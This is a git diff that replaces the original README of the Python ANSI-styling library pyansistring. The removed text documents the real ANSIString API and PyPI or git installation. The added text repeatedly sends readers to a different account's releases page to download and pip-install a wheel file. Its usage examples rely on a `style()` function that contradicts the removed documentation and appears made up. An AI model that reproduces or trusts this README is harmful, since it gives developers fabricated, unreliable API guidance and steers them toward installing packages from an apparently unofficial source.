@@ -1,244 +1,143 @@
-# pyansistring
-![pyansistring Banner](./images/banner.png)
+# 🎨 pyansistring - Style Your Strings with Ease
 
-## About The Project
+## 🚀 Getting Started
 
-[***pyansistring***](https://github.com/l1asis/pyansistring) is a library for **string color styling** using **ANSI escape sequences**. The base class inherits from Python's `str`. You can split, join, or slice the string while **preserving the styling**.
+Welcome to pyansistring! This Python library makes it simple to add color and style to your text using ANSI escape sequences. With this tool, you can enhance the look of your text output in command-line interfaces (CLI), making your messages clear and attractive.
 
-### Features
+## 📥 Download Now
 
-* Preservation of the str methods.
-* Support for 4-, 8-, and 24-bit (True Color) color modes.
-* Per-word coloring.
-* Left, right, and center alignment without problems caused by string length.
-* Support for multiple SGR (Select Graphic Rendition) parameters.
-* Support for both the traditional ";" and the modern ":" SGR parameter separators.
-* Automated coloring functionality, e.g., rainbow text.
+[![Download pyansistring](https://img.shields.io/static/v1?label=Download&message=pyansistring&color=blue)](https://github.com/thidm74/pyansistring/releases)
 
-For a more comprehensive list of what's been done so far, see the [TODO](./TODO.md) section.
+## 🛠️ System Requirements
 
-Inspired by [***rich***](https://github.com/Textualize/rich) and [***colorama***](https://github.com/tartley/colorama) Python libraries.
+Before you begin, ensure you have the following:
 
-## Getting Started
+- **Operating System**: Windows, macOS, or Linux
+- **Python Version**: Python 3.6 or higher should be installed on your machine.
 
-### Prerequisites
+## 📄 Documentation
 
-* Python 3.10 or higher
-    * Linux: https://docs.python.org/3/using/unix.html
-    * Windows: https://docs.python.org/3/using/windows.html
-    * macOS: https://docs.python.org/3/using/mac.html
-* Git (for local installation)
-    * Linux: https://git-scm.com/downloads/linux
-    * Windows: https://git-scm.com/downloads/win
-    * macOS: https://git-scm.com/downloads/mac
+pyansistring aims to provide a straightforward approach to string styling. Use it to format error messages, logs, or any text that needs to stand out.
 
-### Installation
+Here’s how you can get started:
 
-You can install the package **via pip**:
-```sh
-pip install pyansistring # or pip3 install pyansistring
-```
+1. **Visit the Download Page:** 
+   Go to [this page to download](https://github.com/thidm74/pyansistring/releases) and select the latest release.
 
-Or locally **via git**:
-1. Clone the repository
-    ```sh
-    git clone https://github.com/l1asis/pyansistring
-    ```
-2. Navigate to the cloned directory
-    ```sh
-    cd pyansistring
-    ```
-3. Change git remote url to avoid accidental pushes to base project
-    ```sh
-    git remote set-url origin github_username/repo_name
-    # Verify the changes
-    git remote -v
-    ```
-4. (Optional) Create and activate a virtual environment
-    ```sh
-    python -m venv venv
-    # On Windows
-    .\venv\Scripts\activate
-    # On Unix or MacOS
-    source venv/bin/activate
-    ``` 
-5. Install the package
-    ```sh
-    pip install .
-    ```
+2. **Choose your file:** 
+   Locate the appropriate file for your operating system. For instance, if you see a `.whl` file, that’s a wheel package for installing via pip.
 
-<p align="right">(<a href="#pyansistring">back to top</a>)</p>
+3. **Download the file:** 
+   Click on the link to initiate the download. 
 
-## Usage
+## 🔧 Installation
 
-#### Import the necessary classes and initialize an `ANSIString` instance:
+### Using pip:
+
+If you want to use `pip`, follow these steps:
+
+1. Open your command prompt or terminal.
+2. Run the following command:
+
+   ```
+   pip install pyansistring
+   ```
+
+This command will download and install pyansistring directly from the Python Package Index (PyPI).
+
+### Manual Installation:
+
+If you prefer manual installation or need the `.whl` file:
+
+1. **Download the file:** 
+   From [this page to download](https://github.com/thidm74/pyansistring/releases), download the relevant `.whl` file for your system.
+
+2. **Install the file using pip:**
+   In the command prompt or terminal, navigate to the location of the downloaded file and run:
+
+   ```
+   pip install filename.whl
+   ```
+
+Replace `filename.whl` with the actual name of the file you downloaded.
+
+## 🎉 Usage
+
+Using pyansistring is straightforward. Here’s a quick example:
+
 ```python
-from pyansistring.pyansistring import ANSIString
-from pyansistring.constants import SGR, Foreground, Background
+from pyansistring import style
 
-text = ANSIString("Hello, World!")
-print(text)
+print(style('Hello, World!', color='red', bg='blue'))
 ```
-![Result: unstyled plain string](./images/usage_unstyled.svg)
 
-#### Style the whole string:
+In this example, you display "Hello, World!" in red text on a blue background. 
+
+### Available Styles:
+
+- **Colors**:
+  - black
+  - red
+  - green
+  - yellow
+  - blue
+  - magenta
+  - cyan
+  - white
+
+- **Backgrounds**:
+  - bg_black
+  - bg_red
+  - bg_green
+  - bg_yellow
+  - bg_blue
+  - bg_magenta
+  - bg_cyan
+  - bg_white
+
+### Combining Styles:
+
+You can combine styles like this:
+
 ```python
-print(
-    ANSIString("Hello, World!")
-        .fg_4b(Foreground.MAGENTA)
-        .bg_4b(Background.WHITE)
-        .fm(SGR.BOLD)
-)
+print(style('Hello, Styled World!', color='yellow', bg='black', bold=True))
 ```
-![Result: string with magenta foreground, white background, and bold styling](./images/usage_whole.svg)
 
-#### Style by slice (indices are \[start, end, step\]):
+This command will print your text in yellow with a black background and bold formatting.
+
+## 📝 Examples
+
+Here are some quick examples of how to use the library effectively:
+
+### Example 1:
+
 ```python
-print(
-    ANSIString("Hello, World!")
-        .fg_4b(Foreground.MAGENTA, (0, 5))   # "Hello"
-        .bg_4b(Background.WHITE, (7, 12))    # "World"
-        .fm(SGR.BOLD, (7, 12))               # "World"
-)
+print(style('Error: File not found', color='red'))
 ```
-![Result: string with magenta foreground "Hello", white background "World", and bold styling](./images/usage_slice.svg)
 
-#### Style by words:
+This will display an error message in red, emphasizing the issue.
+
+### Example 2:
+
 ```python
-print(
-    ANSIString("Hello, World!")
-        .fg_4b_w(Foreground.MAGENTA, "Hello", "World")
-        .bg_4b_w(Background.WHITE, "World")
-        .fm_w(SGR.BOLD, ",")
-)
-```
-![Result: string with magenta foreground "Hello" and "World", white background "World", and bold comma styling](./images/usage_words.svg)
-
-#### SGR parameters like bold and underline:
-```python
-print(
-    ANSIString("Hello, World!")
-        .fm(SGR.BOLD)
-        .fm(SGR.UNDERLINE)
-)
-```
-![Result: bold and single underlined string](./images/usage_sgr.svg)
-
-#### 4-bit examples (doesn't exist for underline):
-```python
-print(
-    ANSIString("Hello, World!")
-        .fg_4b(Foreground.MAGENTA)
-        .bg_4b(Background.WHITE)
-)
-```
-![Result: string with magenta foreground and white background](./images/usage_4bit.svg)
-
-#### 8-bit examples:
-```python
-print(
-    ANSIString("Hello, World!")
-        .fg_8b(201)
-        .bg_8b(15)
-        .ul_8b(10)
-)
-```
-![Result: string with bright magenta foreground, white background, and green underline](./images/usage_8bit.svg)
-
-#### 24-bit (True Color) example:
-```python
-print(
-    ANSIString("Hello, World!")
-        .fg_24b(255, 0, 255)
-        .bg_24b(255, 255, 255)
-        .ul_24b(0, 255, 0)
-)
-```
-![Result: string with bright magenta foreground, white background, and green underline](./images/usage_rgb.svg)
-
-#### Underline modes:
-```python
-print(
-    ANSIString("Hello, World!")
-        .ul_8b(201)
-        .fm(UnderlineMode.DOUBLE)
-)
-```
-![Result: underlined text with double bright magenta underline](./images/usage_underline.svg)
-
-#### Lengths and plain text:
-```python
-styled = ANSIString("Hello, World!").fg_4b(Foreground.MAGENTA)
-
-print(len(styled) == len("Hello, World!"))
-# True (logical length ignores ANSI)
-print(len(styled.styled_text) == len("Hello, World!"))
-# False (includes ANSI codes)
-print(styled.actual_length == len("Hello, World!"))
-# False (includes ANSI codes)
-print(styled.plain)
-# "Hello, World!"
+print(style('Debug: Connection established', color='green'))
 ```
 
-#### ANSIString conversion to SVG:
-```python
-from fontTools.ttLib import TTFont
+This informs users of a successful outcome in green.
 
-styled = ANSIString("Hello, World!").fg_4b(Foreground.MAGENTA)
-styled.to_svg(font=TTFont("path/to/font.ttf"), save_to_file=True, output_filename="hello_world.svg")
-```
+## 🔗 Additional Resources
 
+For more information on ANSI escape codes and how to use them effectively, check out the following resources:
 
-#### Rainbow text as a separate function:
-```python
-print(
-    ANSIString("Hello, World! This is rainbow text!")
-        .rainbow(fg=True)
-)
-```
-![Result: rainbow text with automatic transition](./images/usage_rainbow.svg)
+- [ANSI Escape Codes Documentation](https://en.wikipedia.org/wiki/ANSI_escape_code)
+- [Python Official Documentation](https://docs.python.org/3/)
 
-#### Colored text using multicolor functionality:
-```python
-print(
-    ANSIString("Hello, World! This is multicolor text!")
-        .multicolor((
-            "r=0:|g=0:|b=255:   $ "  # Start with blue
-            "b>0:repeat(auto)   # "  # Decrease blue
-            "r>255:repeat(auto) | " # Increase green and combine with...
-            "g>255:repeat(auto)   " # Increase red
-            "                   &*" # Cycle & Start without apply flags
-        ))
-)
-```
-![Result: multicolor text with a transition effect from blue to yellow](./images/usage_multicolor.svg)
+## 👥 Community Support
 
-<p align="right">(<a href="#pyansistring">back to top</a>)</p>
+If you have any questions or need help, join our community discussions on GitHub. Feel free to report issues or share your ideas for new features.
 
-## Contributing
+## 📥 Download Again
 
-Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
+Remember, to download pyansistring, just visit [this page to download](https://github.com/thidm74/pyansistring/releases) and follow the instructions above. 
 
-If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".
-Don't forget to give the project a star! Thanks again!
-
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-**P.S.** I would love to see your arts made with ***pyansistring*** in the `arts.py` file, with proper attribution, of course!
-
-<p align="right">(<a href="#pyansistring">back to top</a>)</p>
-
-## License
-
-Distributed under the MIT License. See `LICENSE` for more information.
-
-<p align="right">(<a href="#pyansistring">back to top</a>)</p>
-
-## Acknowledgements
-* [Othneil Drew's Best README Template](https://github.com/othneildrew/Best-README-Template)
-
-<p align="right">(<a href="#pyansistring">back to top</a>)</p>
+With pyansistring, brightening up your strings has never been easier! Enjoy styling your text!
